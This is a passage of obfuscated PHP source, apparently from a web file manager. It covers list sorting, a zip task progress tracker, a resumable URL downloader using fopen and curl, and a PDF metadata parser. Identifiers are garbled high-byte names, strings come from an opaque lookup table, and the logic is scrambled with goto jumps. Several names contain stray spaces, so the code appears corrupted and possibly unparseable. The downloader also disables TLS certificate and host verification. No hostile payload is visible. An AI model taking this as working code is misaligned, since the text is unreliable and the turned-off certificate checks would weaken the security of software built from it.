$aÄ¡·øê¥Ò = $this->listData($cõ¿Ú‡¼·ƒ); $f¾™‹µÆ× = $this->findByName($f••¿ôÚ[$aµŠ†­­ôã[28]]); if (!$aÄ¡·øê¥Ò || $f¾™‹µÆ× && $f¾™‹µÆ×[$aµŠ†­­ôã[367]] != $aÄ¡·øê¥Ò[$aµŠ†­­ôã[367]]) { return !1; } return parent::update($cõ¿Ú‡¼·ƒ, $f••¿ôÚ); } public function moveTop($EçøªŠ‰ÕÜ) { $Eİ¾ŞÑòíœ =& $_SERVER[¯Ò¬Èè]; $A¹ÊîáÆÊ« = parent::listData(); $b”é¤åœš = $this->getSort($Eİ¾ŞÑòíœ[245]); foreach ($A¹ÊîáÆÊ« as &$F°Ü˜çó´ó) { if ($F°Ü˜çó´ó[$Eİ¾ŞÑòíœ[367]] == $EçøªŠ‰ÕÜ) { $F°Ü˜çó´ó[$Eİ¾ŞÑòíœ[2135]] = $b”é¤åœš; continue; } $F°Ü˜çó´ó[$Eİ¾ŞÑòíœ[2135]] += 1; } return parent::resetData($A¹ÊîáÆÊ«); } public function moveBottom($c™–›¹Üªˆ) { $E¶Û‚é¬ÚÈ =& $_SERVER[¯Ò¬Èè]; $D‡ÍÓÉğŸ = $this->getSort($E¶Û‚é¬ÚÈ[246]) + 1; return parent::update($c™–›¹Üªˆ, array($E¶Û‚é¬ÚÈ[2135] => $D‡ÍÓÉğŸ)); } public function resetSort($a½šˆ¼Ì¾¥) { goto Eø·’«¯Œ‡; e¹ñè”•ºã: return parent::resetData($C…öÓ¬ãê); goto F ’¾ñâÂ¨; a®‡Ñ³õ–¤: for ($aİÑÜº”ç‘ = 0; $aİÑÜº”ç‘ < count($a½šˆ¼Ì¾¥); $aİÑÜº”ç‘++) { $B¬‚©÷ÎùÔ[$a½šˆ¼Ì¾¥[$aİÑÜº”ç‘] . $a’ä¿‘²Ë[33]] = $aİÑÜº”ç‘ + 1; } $C…öÓ¬ãê = parent::listData(); foreach ($C…öÓ¬ãê as &$DĞÂ¸¥”í) { $BğÂÈ†”âê = $B¬‚©÷ÎùÔ[$DĞÂ¸¥”í[$a’ä¿‘²Ë[367]]]; $DĞÂ¸¥”í[$a’ä¿‘²Ë[2135]] = $BğÂÈ†”âê ? $BğÂÈ†”âê : $DĞÂ¸¥”í[$a’ä¿‘²Ë[2135]]; } goto e¹ñè”•ºã; Eø·’«¯Œ‡: $a’ä¿‘²Ë =& $_SERVER[¯Ò¬Èè]; $B¬‚©÷ÎùÔ = array(); $a½šˆ¼Ì¾¥ = is_array($a½šˆ¼Ì¾¥) ? $a½šˆ¼Ì¾¥ : array(); goto a®‡Ñ³õ–¤; F ’¾ñâÂ¨: } private function getSort($fÂÔóëçÒ´) { $Dôä°×Ï õ =& $_SERVER[¯Ò¬Èè]; $B†º»£Çè¦ = parent::listData(); $E‡«ñ¹‡” = array_to_keyvalue($B†º»£Çè¦, $Dôä°×Ï õ[33], $Dôä°×Ï õ[2135]); if (!$E‡«ñ¹‡”) { $E‡«ñ¹‡” = array(0); } $C³œ“œÕä = $fÂÔóëçÒ´ == $Dôä°×Ï õ[246] ? max($E‡«ñ¹‡”) : min($E‡«ñ¹‡”); return intval($C³œ“œÕä); } } goto cƒÆæ¿Áì; e÷—®ùÛÆÅ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $a½Åáœæó› =& $_SERVER[¯Ò¬Èè]; parent::startAfter(); Hook::bind($a½Åáœæó›[1522], array($this, $a½Åáœæó›[1517])); $D×ñ±²¸Óİ =& $this->task; $D×ñ±²¸Óİ[$a½Åáœæó›[1519]] = $a½Åáœæó›[1049]; if (!$D×ñ±²¸Óİ[$a½Åáœæó›[1352]]) { $D×ñ±²¸Óİ[$a½Åáœæó›[1352]] = LNG($a½Åáœæó›[1523]); } } protected function endAfter() { $c­âß³ò =& $_SERVER[¯Ò¬Èè]; parent::endAfter(); Hook::unbind($c­âß³ò[1522], array($this, $c­âß³ò[1517])); } public function updateAfter() { $Aˆ²È¼¬¼¹ =& $_SERVER[¯Ò¬Èè]; $d‡†éïÇˆ =& $this->task; if (!$d‡†éïÇˆ[$Aˆ²È¼¬¼¹[985]] || !$d‡†éïÇˆ[$Aˆ²È¼¬¼¹[712]]) { return; } if ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1519]] == $Aˆ²È¼¬¼¹[1049]) { $E™•ÛÃÙìÜ = $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1492]]; if ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1493]] != $Aˆ²È¼¬¼¹[1049]) { $E™•ÛÃÙìÜ = 0; } $D»Ÿ¾‹ƒ¬’ = ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1496]] + $E™•ÛÃÙìÜ) / $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[712]]; $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1447]] = $D»Ÿ¾‹ƒ¬’ * 0.3; } else { if ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1519]] == $Aˆ²È¼¬¼¹[301]) { $D»Ÿ¾‹ƒ¬’ = $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[999]] / $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[985]]; $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1447]] = 0.3 + $D»Ÿ¾‹ƒ¬’ * 0.5; } else { if ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1519]] == $Aˆ²È¼¬¼¹[103]) { $D»Ÿ¾‹ƒ¬’ = 0; if ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1491]]) { $D»Ÿ¾‹ƒ¬’ = $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1492]] / $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1491]]; } $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1447]] = 0.3 + 0.5 + $D»Ÿ¾‹ƒ¬’ * 0.2; } } } if ($d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1447]] > 0) { $BÊå‡™¯æ = timeFloat() - $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1449]] - $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1452]]; $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1453]] = $BÊå‡™¯æ * (1 - $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1447]]) / $d‡†éïÇˆ[$Aˆ²È¼¬¼¹[1447]]; } } public function copyFileStart($b §Çº«Ç¢, $böéÓ‰õîì, $E¼Õ¾»ù”Ê, $CÀ×âùÍì³, $Cª÷ã¤®©, $BéÈá´¢) { $AŒÀ•Ï•õ =& $_SERVER[¯Ò¬Èè]; parent::copyFileStart($b §Çº«Ç¢, $böéÓ‰õîì, $E¼Õ¾»ù”Ê, $CÀ×âùÍì³, $Cª÷ã¤®©, $BéÈá´¢); $B‡¥óÒƒ…Á =& $this->task; if ($B‡¥óÒƒ…Á[$AŒÀ•Ï•õ[1519]] == $AŒÀ•Ï•õ[301]) { $B‡¥óÒƒ…Á[$AŒÀ•Ï•õ[1519]] = $AŒÀ•Ï•õ[103]; } $this->update(); } public function copyFileEnd($Eçò™äŠ‡¿, $D®„šÚÍÏ, $a—±ø…ÊÂ, $B·ôŒ­¬áœ, $A¸À‹á§ğ, $CÇê‚«áÌë) { $c×àªÊ›² =& $_SERVER[¯Ò¬Èè]; $b¤éÑ®ºÓÒ =& $this->task; $b¤éÑ®ºÓÒ[$c×àªÊ›²[1492]] = $b¤éÑ®ºÓÒ[$c×àªÊ›²[1491]]; $b¤éÑ®ºÓÒ[$c×àªÊ›²[1496]] += $b¤éÑ®ºÓÒ[$c×àªÊ›²[1491]]; $b¤éÑ®ºÓÒ[$c×àªÊ›²[1493]] = $c×àªÊ›²[33]; $this->update(); } public function nameParse($a“„—Ó›·ª) { $eÓ¿—ëô’Á =& $_SERVER[¯Ò¬Èè]; $c²åéÙ…ô =& $this->task; if ($c²åéÙ…ô[$eÓ¿—ëô’Á[999]] < $c²åéÙ…ô[$eÓ¿—ëô’Á[985]]) { $b±‡›™ñÔæ = get_path_this($a“„—Ó›·ª); if (strstr($b±‡›™ñÔæ, $eÓ¿—ëô’Á[91])) { $c²åéÙ…ô[$eÓ¿—ëô’Á[999]] += 1; } } if ($c²åéÙ…ô[$eÓ¿—ëô’Á[1519]] == $eÓ¿—ëô’Á[1049]) { $c²åéÙ…ô[$eÓ¿—ëô’Á[1519]] = $eÓ¿—ëô’Á[301]; } $c²åéÙ…ô[$eÓ¿—ëô’Á[1489]] = $a“„—Ó›·ª; $this->update(); } } class Downloader { static function start($FêôÌŒÆ –, $E‚ÏÒîàÏÊ, $C¡ê—•òÕ = 10) { goto AÄÜ¬–‚; fƒ¸Æ¨ô‹ğ: $dóàÀÕ• = $E‚ÏÒîàÏÊ . $FÉ«Ä›‹”[1525]; if (is_array($FêôÌŒÆ –)) { $E‰“ÃŒÕÄÒ = $FêôÌŒÆ –; } else { $E‰“ÃŒÕÄÒ = url_header($FêôÌŒÆ –); } $FêôÌŒÆ – = $E‰“ÃŒÕÄÒ[$FÉ«Ä›‹”[295]]; goto b¯ô¦†ù; AÄÜ¬–‚: $FÉ«Ä›‹” =& $_SERVER[¯Ò¬Èè]; if (!request_url_safe($FêôÌŒÆ –)) { return array($FÉ«Ä›‹”[1041] => !1, $FÉ«Ä›‹”[1043] => $FÉ«Ä›‹”[1046]); } $DÓ® ÔÀ… = $E‚ÏÒîàÏÊ . $FÉ«Ä›‹”[1524]; goto fƒ¸Æ¨ô‹ğ; b¯ô¦†ù: if (!$FêôÌŒÆ –) { return array($FÉ«Ä›‹”[1041] => !1, $FÉ«Ä›‹”[1043] => $FÉ«Ä›‹”[1046]); } if (!$E‰“ÃŒÕÄÒ[$FÉ«Ä›‹”[1296]] || $E‰“ÃŒÕÄÒ[$FÉ«Ä›‹”[325]] == 0) { @unlink($dóàÀÕ•); @unlink($E‚ÏÒîàÏÊ); $fñØ…ºîÒù = self::fileDownloadFopen($FêôÌŒÆ –, $E‚ÏÒîàÏÊ, $E‰“ÃŒÕÄÒ[$FÉ«Ä›‹”[325]]); if ($fñØ…ºîÒù[$FÉ«Ä›‹”[1041]]) { return $fñØ…ºîÒù; } else { @unlink($dóàÀÕ•); @unlink($E‚ÏÒîàÏÊ); $fñØ…ºîÒù = self::fileDownloadCurl($FêôÌŒÆ –, $E‚ÏÒîàÏÊ, !1, 0, $E‰“ÃŒÕÄÒ[$FÉ«Ä›‹”[325]]); @unlink($dóàÀÕ•); return $fñØ…ºîÒù; } } $câ¤ùºçÏ‰ = is_file($dóàÀÕ•) ? filesize($dóàÀÕ•) : 0; goto b³¯‡ …¹¡; d•õÔ‰Ñƒ: if (is_file($DÓ® ÔÀ…)) { $fíñ‰é…  = file_get_contents($DÓ® ÔÀ…); $Fâá´Ô¾é† = json_decode($fíñ‰é… , 1); } if (file_exists($E‚ÏÒîàÏÊ) && $BÎ§ãîœÖ² == filesize($E‚ÏÒîàÏÊ)) { @unlink($dóàÀÕ•); @unlink($DÓ® ÔÀ…); return array($FÉ«Ä›‹”[1041] => !0, $FÉ«Ä›‹”[1043] => $FÉ«Ä›‹”[1527]); } if ($Fâá´Ô¾é†[$FÉ«Ä›‹”[325]] != $BÎ§ãîœÖ²) { $Fâá´Ô¾é† = array($FÉ«Ä›‹”[325] => $BÎ§ãîœÖ²); } goto E¡“ñéŸÄ; b³¯‡ …¹¡: $BÎ§ãîœÖ² = intval($E‰“ÃŒÕÄÒ[$FÉ«Ä›‹”[325]]); if (file_exists($dóàÀÕ•) && time() - filemtime($dóàÀÕ•) < 3) { return array($FÉ«Ä›‹”[1041] => !1, $FÉ«Ä›‹”[1043] => $FÉ«Ä›‹”[1526]); } $Fâá´Ô¾é† = array(); goto d•õÔ‰Ñƒ; B‚Èæ›™™İ: if ($fñØ…ºîÒù[$FÉ«Ä›‹”[1041]]) { @unlink($DÓ® ÔÀ…); } return $fñØ…ºîÒù; goto DŸÁ—Šíù; E¡“ñéŸÄ: if ($câ¤ùºçÏ‰ > $BÎ§ãîœÖ²) { @unlink($dóàÀÕ•); } file_put_contents($DÓ® ÔÀ…, json_encode($Fâá´Ô¾é†)); $fñØ…ºîÒù = self::fileDownloadCurl($FêôÌŒÆ –, $E‚ÏÒîàÏÊ, !0, $câ¤ùºçÏ‰, $BÎ§ãîœÖ²); goto B‚Èæ›™™İ; DŸÁ—Šíù: } static function fileDownloadFopen($BäÃÎ½‡ùø, $d²ÙÚî¬®õ, $c…˜‘ÉÓœî = 0) { $C¤‘ŠŞßí½ =& $_SERVER[¯Ò¬Èè]; @ini_set($C¤‘ŠŞßí½[1528], $C¤‘ŠŞßí½[1529]); $d•ïŠ†á“Ó = $d²ÙÚî¬®õ . $C¤‘ŠŞßí½[1525]; set_timeout(); @unlink($d•ïŠ†á“Ó); if ($C·Ö­Á¢ŸÂ = @fopen($BäÃÎ½‡ùø, $C¤‘ŠŞßí½[1530])) { goto eÉô†ÅÑÓ²; FÒ£§áº®Ê: return array($C¤‘ŠŞßí½[1041] => !0, $C¤‘ŠŞßí½[1043] => $C¤‘ŠŞßí½[710]); goto DËÙëË©é¨; eÉô†ÅÑÓ²: if (!($B¬ÄÒÔñç§ = @fopen($d•ïŠ†á“Ó, $C¤‘ŠŞßí½[1531]))) { return array($C¤‘ŠŞßí½[1041] => !1, $C¤‘ŠŞßí½[1043] => $C¤‘ŠŞßí½[1532]); } while (!feof($C·Ö­Á¢ŸÂ)) { if (!file_exists($d•ïŠ†á“Ó)) { fclose($B¬ÄÒÔñç§); return array($C¤‘ŠŞßí½[1041] => !1, $C¤‘ŠŞßí½[1043] => $C¤‘ŠŞßí½[1533]); } clearstatcache(); if ($c…˜‘ÉÓœî > 0 && $c…˜‘ÉÓœî == filesize(iconv_system($d•ïŠ†á“Ó))) { break; } fwrite($B¬ÄÒÔñç§, fread($C·Ö­Á¢ŸÂ, 1024 * 8), 1024 * 8); } fclose($B¬ÄÒÔñç§); goto Fá¡¤ØÛÇ; Fá¡¤ØÛÇ: fclose($C·Ö­Á¢ŸÂ); self::checkGzip($d•ïŠ†á“Ó); if (!@rename($d•ïŠ†á“Ó, $d²ÙÚî¬®õ)) { usleep(round(rand(0, 1000) * 50)); @unlink($d²ÙÚî¬®õ); $FØŸŞ°í­¿ = @rename($d•ïŠ†á“Ó, $d²ÙÚî¬®õ); if (!$FØŸŞ°í­¿) { return array($C¤‘ŠŞßí½[1041] => !1, $C¤‘ŠŞßí½[1043] => $C¤‘ŠŞßí½[1534]); } } goto FÒ£§áº®Ê; DËÙëË©é¨: } else { return array($C¤‘ŠŞßí½[1041] => !1, $C¤‘ŠŞßí½[1043] => $C¤‘ŠŞßí½[1535]); } } static function fileDownloadCurl($Fò¿¼‘¸Ÿò, $b©»µÃÁ‡, $B¾‰ù›¾…± = false, $Eõ’‰ˆ‡ÕÆ = 0, $E«Ú™¼×…ô = 0) { goto cÄæ¨Ó¡’¨; c›„øô¤ß×: $cíŠ¾¼ø = @fopen($FÙ Õ¼Ü¾‚, $fßÀÏ® Ï[989]); if (!$cíŠ¾¼ø) { return array($fßÀÏ® Ï[1041] => !1, $fßÀÏ® Ï[1043] => $fßÀÏ® Ï[1536]); } $bäÉÄ¸—Å = curl_init($Fò¿¼‘¸Ÿò); goto a„…æ§²µá; a„…æ§²µá: if ($B¾‰ù›¾…±) { curl_setopt($bäÉÄ¸—Å, CURLOPT_RANGE, $Eõ’‰ˆ‡ÕÆ . $fßÀÏ® Ï[730]); } curl_setopt($bäÉÄ¸—Å, CURLOPT_FILE, $cíŠ¾¼ø); curl_setopt($bäÉÄ¸—Å, CURLOPT_REFERER, get_url_link($Fò¿¼‘¸Ÿò)); goto bÍÒö¤¤”; b¶‡ó´˜Ú: curl_close($bäÉÄ¸—Å); fclose($cíŠ¾¼ø); $D®áâÜ ô = filesize(iconv_system($FÙ Õ¼Ü¾‚)); goto f¸…è•ñ¸; dÌ àš±šÀ: curl_setopt($bäÉÄ¸—Å, CURLOPT_USERAGENT, $fßÀÏ® Ï[1529]); $D¿ÖÆ·¯ = curl_exec($bäÉÄ¸—Å); curl_progress_end($bäÉÄ¸—Å); goto b¶‡ó´˜Ú; cÄæ¨Ó¡’¨: $fßÀÏ® Ï =& $_SERVER[¯Ò¬Èè]; $FÙ Õ¼Ü¾‚ = $b©»µÃÁ‡ . $fßÀÏ® Ï[1525]; set_timeout(); goto c›„øô¤ß×; bÍÒö¤¤”: curl_setopt($bäÉÄ¸—Å, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bäÉÄ¸—Å, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bäÉÄ¸—Å, CURLOPT_SSL_VERIFYHOST, 0); goto dÔ”±œ¡©; f¸…è•ñ¸: if ($D®áâÜ ô < $E«Ú™¼×…ô && $E«Ú™¼×…ô != 0) { return array($fßÀÏ® Ï[1041] => !1, $fßÀÏ® Ï[1043] => $fßÀÏ® Ï[1526]); } if ($D¿ÖÆ·¯ && filesize($FÙ Õ¼Ü¾‚) != 0) { self::checkGzip($FÙ Õ¼Ü¾‚); if (!@rename($FÙ Õ¼Ü¾‚, $b©»µÃÁ‡)) { @unlink($b©»µÃÁ‡); $D¿ÖÆ·¯ = @rename($FÙ Õ¼Ü¾‚, $b©»µÃÁ‡); if (!$D¿ÖÆ·¯) { return array($fßÀÏ® Ï[1041] => !1, $fßÀÏ® Ï[1043] => $fßÀÏ® Ï[1538]); } } return array($fßÀÏ® Ï[1041] => !0, $fßÀÏ® Ï[1043] => $fßÀÏ® Ï[710]); } return array($fßÀÏ® Ï[1041] => !1, $fßÀÏ® Ï[1043] => $fßÀÏ® Ï[1539]); goto E¤ˆ¾­‚Šœ; dÔ”±œ¡©: curl_setopt($bäÉÄ¸—Å, CURLOPT_NOPROGRESS, !1); curl_setopt($bäÉÄ¸—Å, CURLOPT_PROGRESSFUNCTION, $fßÀÏ® Ï[1537]); curl_progress_start($bäÉÄ¸—Å); goto dÌ àš±šÀ; E¤ˆ¾­‚Šœ: } static function checkGzip($F’ó‹Ãá¢‘) { goto dø­è¦ë‹ƒ; dø­è¦ë‹ƒ: $D²×‚äƒ¡ = $_SERVER[¯Ò¬Èè][1540]; $b®®§‡¸˜Î = file_sub_str($F’ó‹Ãá¢‘, 0, 2); if ($D²×‚äƒ¡ != $b®®§‡¸˜Î) { return; } goto C¹Æõ¯íô–; B©Ùˆœ‰ŠÉ: file_put_contents($F’ó‹Ãá¢‘, $aÉƒÒŒ»Ş‡); goto C¶óğÉã‘ˆ; C¹Æõ¯íô–: ob_start(); readgzfile($F’ó‹Ãá¢‘); $aÉƒÒŒ»Ş‡ = ob_get_clean(); goto B©Ùˆœ‰ŠÉ; C¶óğÉã‘ˆ: } } class FileParsePdf { public static function parse($Fê«ö¥ï´¨) { goto dïÊ»ïÄ‡«; d†è¯”Âáø: if ($E¸­Æ±¹ˆ“[1] && $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1549]] < $E¸­Æ±¹ˆ“[1][0]) { $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1549]] = $E¸­Æ±¹ˆ“[1][0]; } $A‡ùôÊ¼å’ = self::parseInfoItem($A‡ùôÊ¼å’); return $A‡ùôÊ¼å’; goto F™§“èš©ß; CÀ¦¼¥¶©: preg_match($a‡óğï‡¦ä, $d­î×ÚÀæœ[$b¾ªÀ‰Û[1543]], $E¸­Æ±¹ˆ“); if (!$A‡ùôÊ¼å’[$b¾ªÀ‰Û[1545]] && count($E¸­Æ±¹ˆ“) == 5) { $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1545]] = $E¸­Æ±¹ˆ“[3]; $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1547]] = $E¸­Æ±¹ˆ“[4]; } preg_match($b¾ªÀ‰Û[1548], $d­î×ÚÀæœ[$b¾ªÀ‰Û[1542]], $E¸­Æ±¹ˆ“); goto dñ¸‚®ÃÛÜ; dĞ§¿Ó±‡Î: $a‡óğï‡¦ä = $b¾ªÀ‰Û[1546]; preg_match($a‡óğï‡¦ä, $d­î×ÚÀæœ[$b¾ªÀ‰Û[1542]], $E¸­Æ±¹ˆ“); if (!$A‡ùôÊ¼å’[$b¾ªÀ‰Û[1545]] && count($E¸­Æ±¹ˆ“) == 5) { $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1545]] = $E¸­Æ±¹ˆ“[3]; $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1547]] = $E¸­Æ±¹ˆ“[4]; } goto CÀ¦¼¥¶©; cæ³£Æ¥ç²: if ($a”Ò—¹¡‘) { $Eˆößçùß± = $a”Ò—¹¡‘[$b¾ªÀ‰Û[1544]][$b¾ªÀ‰Û[1200]]; $A‡ùôÊ¼å’ = self::getObjectValue($d­î×ÚÀæœ, $a”Ò—¹¡‘, $Eˆößçùß±); } $A‡ùôÊ¼å’ = is_array($A‡ùôÊ¼å’) ? $A‡ùôÊ¼å’ : array(); $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1545]] = 0; goto dĞ§¿Ó±‡Î; f½Â†Äíøƒ: $d­î×ÚÀæœ[$b¾ªÀ‰Û[1542]] = StreamWrapperIO::read($Fê«ö¥ï´¨, 0, $AØ³´¨²à°); $d­î×ÚÀæœ[$b¾ªÀ‰Û[1543]] = StreamWrapperIO::read($Fê«ö¥ï´¨, $d­î×ÚÀæœ[$b¾ªÀ‰Û[77]] - $AØ³´¨²à°, $AØ³´¨²à°); $a”Ò—¹¡‘ = self::decodeXref($d­î×ÚÀæœ); goto cæ³£Æ¥ç²; Aù„”ÕôÒ«: preg_match_all($a‡óğï‡¦ä, $d­î×ÚÀæœ[$b¾ªÀ‰Û[1542]], $E¸­Æ±¹ˆ“); if ($E¸­Æ±¹ˆ“[1] && $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1549]] < $E¸­Æ±¹ˆ“[1][0]) { $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1549]] = $E¸­Æ±¹ˆ“[1][0]; } preg_match_all($a‡óğï‡¦ä, $d­î×ÚÀæœ[$b¾ªÀ‰Û[1543]], $E¸­Æ±¹ˆ“); goto d†è¯”Âáø; dñ¸‚®ÃÛÜ: if ($E¸­Æ±¹ˆ“) { $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1351]] = $E¸­Æ±¹ˆ“[1]; } $A‡ùôÊ¼å’[$b¾ªÀ‰Û[1549]] = 0; $a‡óğï‡¦ä = $b¾ªÀ‰Û[1550]; goto Aù„”ÕôÒ«; dïÊ»ïÄ‡«: $b¾ªÀ‰Û =& $_SERVER[¯Ò¬Èè]; $AØ³´¨²à° = 32 * 1024; $d­î×ÚÀæœ = array($b¾ªÀ‰Û[791] => fopen($Fê«ö¥ï´¨, $b¾ªÀ‰Û[1178]), $b¾ªÀ‰Û[75] => $Fê«ö¥ï´¨, $b¾ªÀ‰Û[77] => filesize($Fê«ö¥ï´¨), $b¾ªÀ‰Û[1541] => $AØ³´¨²à°); goto f½Â†Äíøƒ; F™§“èš©ß: } private static function parseInfoItem($Bè†ó™ÌÜë) { $Eù¿¥¡‡« =& $_SERVER[¯Ò¬Èè]; if (!$Bè†ó™ÌÜë) { return !1; } $DŞÂƒ÷“É³ = array($Eù¿¥¡‡«[1352] => array($Eù¿¥¡‡«[1551], $Eù¿¥¡‡«[33]), $Eù¿¥¡‡«[1552] => array($Eù¿¥¡‡«[1553], $Eù¿¥¡‡«[33]), $Eù¿¥¡‡«[187] => array($Eù¿¥¡‡«[1554], $Eù¿¥¡‡«[210]), $Eù¿¥¡‡«[107] => array($Eù¿¥¡‡«[1555], $Eù¿¥¡‡«[210]), $Eù¿¥¡‡«[1549] => array($Eù¿¥¡‡«[1549], $Eù¿¥¡‡«[276]), $Eù¿¥¡‡«[1545] => array($Eù¿¥¡‡«[1545], $Eù¿¥¡‡«[276]), $Eù¿¥¡‡«[1547] => array($Eù¿¥¡‡«[1547], $Eù¿¥¡‡«[276]), $Eù¿¥¡‡«[1556] => array($Eù¿¥¡‡«[1557], $Eù¿¥¡‡«[33]), $Eù¿¥¡‡«[1558] => array($Eù¿¥¡‡«[1559], $Eù¿¥¡‡«[33]), $Eù¿¥¡‡«[1560] => array($Eù¿¥¡‡«[1351], $Eù¿¥¡‡«[33])); $A¦¿Š¨°»œ = array(); foreach ($DŞÂƒ÷“É³ as $F­ï­¾ó‡Û => $E•ùµò§®Í) { if (!isset($Bè†ó™ÌÜë[$E•ùµò§®Í[0]])) { continue; } $C §éï¾´ì = $Bè†ó™ÌÜë[$E•ùµò§®Í[0]]; if (!$C §éï¾´ì || is_array($C §éï¾´ì)) { continue; } switch ($E•ùµò§®Í[1]) { case $Eù¿¥¡‡«[276]: $C §éï¾´ì = intval($C §éï¾´ì); break; case $Eù¿¥¡‡«[210]: if (substr($C §éï¾´ì, 0, 2) == $Eù¿¥¡‡«[1561]) { $C §éï¾´ì = substr($C §éï¾´ì, 2, 14); } if (strtotime($C §éï¾´ì)) { $C §éï¾´ì = date($Eù¿¥¡‡«[1562], strtotime($C §éï¾´ì)); } break; } $A¦¿Š¨°»œ[$F­ï­¾ó‡Û] = $C §éï¾´ì; } return $A¦¿Š¨°»œ; } private static function decodeXref(&$fìÈ…ìéƒ) { goto f¡§Í–†ñê; d³‚–©†Ã: if ($fìÈ…ìéƒ[$c–¨Ò ×š“[77]] - $f¦ÔŒ•øÕ¤ > $fìÈ…ìéƒ[$c–¨Ò ×š“[1541]]) { $bÂ¹Ì³ÇŒˆ = 4 * $fìÈ…ìéƒ[$c–¨Ò ×š“[1541]]; $fìÈ…ìéƒ[$c–¨Ò ×š“[1541]] = $bÂ¹Ì³ÇŒˆ; $fìÈ…ìéƒ[$c–¨Ò ×š“[1542]] = StreamWrapperIO::read($fìÈ…ìéƒ[$c–¨Ò ×š“[75]], 0, $bÂ¹Ì³ÇŒˆ); $fìÈ…ìéƒ[$c–¨Ò ×š“[1543]] = StreamWrapperIO::read($fìÈ…ìéƒ[$c–¨Ò ×š“[75]], $fìÈ…ìéƒ[$c–¨Ò ×š“[77]] - $bÂ¹Ì³ÇŒˆ, $bÂ¹Ì³ÇŒˆ); $aåÏÒÖä’ = $fìÈ…ìéƒ[$c–¨Ò ×š“[1543]]; } $aêÖ”ôÅ¬ = 0; preg_match_all($c–¨Ò ×š“[1565], $aåÏÒÖä’, $Eİ§”ƒ¶); goto C¸âÛ”…Úš; C¸âÛ”…Úš: foreach ($Eİ§”ƒ¶[3] as $dãÑ¾ÏÒ½† => $F©‚À²ª´¼) { if ($Eİ§”ƒ¶[3][$dãÑ¾ÏÒ½†] == $c–¨Ò ×š“[1566]) { $bõ´¸ËÛ”Ã = $aêÖ”ôÅ¬ . $c–¨Ò ×š“[70] . intval($Eİ§”ƒ¶[2][$dãÑ¾ÏÒ½†]); $aç™ÜÉö Ò[$c–¨Ò ×š“[1563]][$bõ´¸ËÛ”Ã] = intval($Eİ§”ƒ¶[1][$dãÑ¾ÏÒ½†]); ++$aêÖ”ôÅ¬; } else { if ($Eİ§”ƒ¶[3][$dãÑ¾ÏÒ½†] == $c–¨Ò ×š“[1567]) { ++$aêÖ”ôÅ¬; } else { } } } if (preg_match_all($c–¨Ò ×š“[1568], $aåÏÒÖä’, $Eİ§”ƒ¶)) { $AøÙ¹¯Ê = $fìÈ…ìéƒ[$c–¨Ò ×š“[77]] - $fìÈ…ìéƒ[$c–¨Ò ×š“[1541]]; foreach ($Eİ§”ƒ¶[0] as $dãÑ¾ÏÒ½† => $E¶Ûİš¾“) { $f ˆÄÑÛ©‹ = $Eİ§”ƒ¶[1][$dãÑ¾ÏÒ½†] . $c–¨Ò ×š“[70] . $Eİ§”ƒ¶[2][$dãÑ¾ÏÒ½†]; $aç™ÜÉö Ò[$c–¨Ò ×š“[1563]][$f ˆÄÑÛ©‹] = strpos($aåÏÒÖä’, $E¶Ûİš¾“) + $AøÙ¹¯Ê + 1; } } if (preg_match_all($c–¨Ò ×š“[1569], $aåÏÒÖä’, $Eİ§”ƒ¶)) { $dœë¶×§ = count($Eİ§”ƒ¶[1]) == 1 ? $Eİ§”ƒ¶[1][0] : $Eİ§”ƒ¶[1][1]; } else { $dœë¶×§ = substr($aåÏÒÖä’, -1024 * 5); } goto F‰¶¤Ü¼¦; f¡§Í–†ñê: $c–¨Ò ×š“ =& $_SERVER[¯Ò¬Èè]; $aåÏÒÖä’ = $fìÈ…ìéƒ[$c–¨Ò ×š“[1543]]; $aç™ÜÉö Ò = array($c–¨Ò ×š“[1544] => array(), $c–¨Ò ×š“[1563] => array()); goto C™«¾ª°­; C™«¾ª°­: $D•ùª‘ñî¯ = $c–¨Ò ×š“[1564]; if (!preg_match_all($D•ùª‘ñî¯, $aåÏÒÖä’, $Eİ§”ƒ¶, PREG_SET_ORDER, 0)) { return !1; } $f¦ÔŒ•øÕ¤ = intval($Eİ§”ƒ¶[0][1]); goto d³‚–©†Ã; Eƒ£“éòËö: if (preg_match($c–¨Ò ×š“[1575], $dœë¶×§, $Eİ§”ƒ¶) > 0) { $aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[1200]] = intval($Eİ§”ƒ¶[1]) . $c–¨Ò ×š“[70] . intval($Eİ§”ƒ¶[2]); } if (preg_match($c–¨Ò ×š“[1576], $dœë¶×§, $Eİ§”ƒ¶) > 0) { $aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[367]] = array(); $aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[367]][0] = $Eİ§”ƒ¶[1]; $aç™ÜÉö Ò[$c–¨Ò 